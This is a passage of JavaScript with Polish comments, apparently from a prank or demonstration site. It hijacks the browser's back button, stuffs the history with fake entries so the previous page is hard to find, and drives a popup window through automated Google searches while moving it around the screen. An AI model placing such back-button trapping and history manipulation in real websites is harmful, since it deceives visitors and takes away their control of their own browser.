 * Zablokuj przycisk wstecz. Jeśli użytkownik cofnie, wyślij go o stronę do przodu ;-)
 */
function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

/**
 * Wypełnij historię dodatkowymi wpisami dla tej strony, aby utrudnić znalezienie
 * poprzedniej strony w rozwijanym menu przycisku wstecz.
 */
function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  // Ustaw lokalizację z powrotem na początkową, aby użytkownik nie zauważył
  window.history.pushState({}, '', window.location.pathname)
}

/**
 * Pobierz losowe współrzędne x, y dla nowego okna na ekranie. Uwzględnia
 * rozmiar ekranu, rozmiar okna i zostawia bezpieczny margines ze wszystkich stron.
 */
function getRandomCoords () {
  const x = MARGIN +
    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
  return { x, y }
}

/**
 * Pobierz losowy element z podanej tablicy, `arr`.
 */
function getRandomArrayEntry (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

/**
 * Automatyzuje serię wyszukiwań w Google w oknie przeglądarki, przesuwając okno
 * losowo między wyszukiwaniami. - Added by @MARECKIyt
 */
function setupSearchWindow (win) {
  if (!win) return
  win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let searchIndex = 1
  const interval = setInterval(() => {
    if (searchIndex >= SEARCHES.length) {
      clearInterval(interval)
      win.window.location = window.location.pathname
      return
    }

    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    win.window.location = window.location.pathname
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      win.moveTo(x, y)
      win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
      searchIndex += 1
    }, 500)
  }, 2500)
}
